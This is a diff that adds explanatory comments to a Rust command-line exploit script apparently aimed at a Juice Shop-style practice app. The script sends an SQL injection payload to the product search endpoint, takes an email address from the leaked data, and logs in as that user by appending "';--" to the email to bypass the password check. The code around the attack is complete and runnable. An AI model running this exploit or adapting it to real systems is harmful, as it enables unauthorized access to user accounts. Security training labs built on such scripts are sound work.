@@ -195,7 +195,8 @@ use std::error::Error;
 use reqwest::blocking::{Client, Response};
 use serde_json::{json, from_str, Value};
 
-
+/// Simple config holder for target address, port and payload.
+/// Values are taken from command-line arguments.
 struct Config {
     ip_address: String,
     port: u16,
@@ -203,12 +204,20 @@ struct Config {
 }
 
 impl Config {
+    /// Parse command-line arguments into a Config.
+    /// Expected arguments: <program> <ip_address> <port> <payload>
+    /// Returns a Config on success or a &'static str error on failure.
     fn new(mut args: std::env::Args) -> Result<Config, &'static str> {
+        // skip program name
         args.next();
+
+        // read ip address
         let ip_address = match args.next() {
             Some(arg) => arg,
             None => return Err("Didn't get an address argument"),
         };
+
+        // read port as string then parse to u16
         let port_arg = match args.next() {
             Some(arg) => arg,
             None => return Err("Didn't get an port argument"),
@@ -217,59 +226,108 @@ impl Config {
             Ok(p) => p,
             Err(_) => return Err("Port argument must be a number between 0 and 65535"),
         };
+
+        // read payload (used later for the search query)
         let payload = match args.next() {
             Some(arg) => arg,
             None => return Err("Didn't get any payload as argument"),
         };
+
         Ok(Config { ip_address, port, payload })
     }
 }
 
+/// Perform an HTTP GET request to the target application's search endpoint.
+/// The `payload` is interpolated into the query parameter `q`.
+/// Returns the reqwest::blocking::Response or an error.
 fn sql_injection(config: &Config) -> Result<Response, Box<dyn Error>> {
+    // build URL, e.g. http://<ip>:<port>/rest/products/search?q=<payload>
     let url = format!("http://{}:{}/rest/products/search?q={}", config.ip_address, config.port, config.payload);
     let client = Client::new();
+    // send GET request and propagate any network/IO error
     let response = client.get(&url).send()?;
 
     Ok(response)
 }
 
+/// Search the JSON response for a value that matches the query.
+/// - `data_base` is expected to be a JSON string containing an array under the "data" key.
+/// - `query` is a substring to look for (case-insensitive).
+/// The function additionally requires that the matched `name` contains an '@' (likely an email).
+/// On success returns the matched name as a String; otherwise returns an error.
 fn searching_val(data_base: &str, query: &str) -> Result<String, Box<dyn std::error::Error>> {
+    // normalize query to lowercase for case-insensitive search
     let q = query.to_lowercase();
+
+    // parse the JSON string into serde_json::Value
     let v: Value = from_str(data_base)?;
+
+    // drill into "data" key and check it's an array
     if let Some(data) = v.get("data").and_then(|d| d.as_array()) {
         for item in data {
+            // for each item in the array, try to read "name" as string
             if let Some(name) = item.get("name").and_then(|n| n.as_str()) {
+                // check both that the lowercase name contains the query and that it looks like an email
                 if name.to_lowercase().contains(&q) && name.contains('@') {
                     return Ok(name.to_string());
                 }
             }
         }
     }
-    Err(format!("Email containing '{}' not found", query).into())
-}  
 
+    // if nothing matched, return an error describing the missing email
+    Err(format!("Email containing '{}' not found", query).into())
+}
+
+/// Perform a login attempt using the provided email and the target config.
+/// The code appears to append a SQL comment terminator to the email (username) which is an SQLi technique:
+/// username becomes "<email>';--"
+/// Sends JSON payload to /rest/user/login and returns the Response.
 fn login(email: &str, config: &Config) -> Result<Response, Box<dyn Error>> {
+    // build login URL
     let url = format!("http://{}:{}/rest/user/login",config.ip_address, config.port);
+
+    // create a blocking HTTP client
     let client = Client::builder().build()?;
+
+    // craft username with SQL injection pattern (original code uses "';--")
     let username = format!("{}';--", email);
+
+    // static password used here
     let password = String::from("password");
+
+    // build JSON payload: { "email": username, "password": "password" }
     let payload = json!({
         "email": username,
         "password": password
     });
+
+    // send POST request with JSON body
     let response = client.post(&url).json(&payload).send()?;
 
     Ok(response)
-
 }
 
-fn run(config: Config, ) -> Result<(), Box<dyn Error>> {
+/// High-level run routine wiring all steps:
+/// 1. Perform the search request (sql_injection)
+/// 2. Read the response body as text
+/// 3. Extract an email matching "chris" (via searching_val)
+/// 4. Attempt login using that email (via login)
+/// Print status and responses along the way.
+fn run(config: Config) -> Result<(), Box<dyn Error>> {
+    // perform the search request
     let sql_response = sql_injection(&config)?;
     println!("[*] Status: {:?}", sql_response.status());
+
+    // read response body as text (synchronous/blocking)
     let data_base = sql_response.text()?;
     println!("[*] Data base: {:?}", data_base);
+
+    // search for an email that contains "chris"
     let email = searching_val(&data_base, "chris")?;
     println!("Found email: {}", email);
+
+    // try to login using the found email
     let access = login(&email, &config)?;
     println!("[*] Login status: {:?}", access.status());
     println!("[*] Login response: {:?}", access.text());
@@ -277,11 +335,16 @@ fn run(config: Config, ) -> Result<(), Box<dyn Error>> {
 }
 
 fn main() {
+    // parse CLI arguments into Config, exit on failure
     let config = Config::new(env::args()).unwrap_or_else(|err| {
         eprintln!("Problem with parsing arguments{}", err);
         process::exit(1);
     });
+
+    // startup log showing target
     println!("[*] Starting client {}:{}{}", config.ip_address, config.port, config.payload);
+
+    // run the main logic and handle any runtime errors
     if let Err(err) = run(config) {
         eprintln!("Application error {}", err);
         process::exit(1);
